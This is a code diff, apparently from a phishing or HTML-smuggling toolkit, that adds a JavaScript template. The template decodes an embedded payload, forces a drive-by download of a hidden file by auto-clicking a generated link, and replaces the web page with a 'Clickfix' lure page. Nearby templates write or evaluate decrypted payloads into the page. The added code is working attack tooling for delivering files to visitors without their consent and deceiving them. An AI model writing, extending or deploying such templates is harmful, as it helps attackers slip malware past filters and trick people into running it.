@@ -13,6 +13,18 @@ JS_EVAL = "setTimeout(new TextDecoder().decode(og_data))"
 # since decryption is async we do not catch the onload event anymore
 JS_REPLACE = 'setTimeout(()=>{let n=document.open();n.write(new TextDecoder().decode(og_data));n.close()}, 50);'
 
+# Decodes the payload in the form [HTML_LENGTH: uint32, HTML: str, FILE_BYTES: Uint8Array]
+# Then it starts a drive by download for the FILE_BYTES using the original name
+# At the same time it replaces the website with the Clickfix page
+JS_CLICKFIX_WITH_DRIVEBY_DOWNLOAD = """
+  const view = new DataView(og_data.buffer, og_data.byteOffset, og_data.byteLength);
+  const htmlLen = view.getUint32(0, true);
+  const html = new TextDecoder().decode(og_data.subarray(4, 4 + htmlLen));
+  const file_bytes = og_data.slice(4 + htmlLen);
+let b=new Blob([file_bytes],{type:"application/octet-stream"});let u=URL.createObjectURL(b);document.body.innerHTML=`<a href="${u}" download="{{NAME}}" id="auto-click">Click here if the download does not start automatically</a>`;setTimeout(()=>document.getElementById("auto-click").click(),50);
+setTimeout(()=>{let n=document.open();n.write(html);n.close()}, 50);
+"""
+
 # document.open does not work in SVG, so we add an text element to it.
 # The only issue is that it does not wrap text, so we also print it to the console
 # @TODO This usually results in the error: Uncaught (in promise) SyntaxError: Failed to set the 'innerHTML' property on 'Element': The provided markup is invalid XML, and therefore cannot be inserted into an XML document.
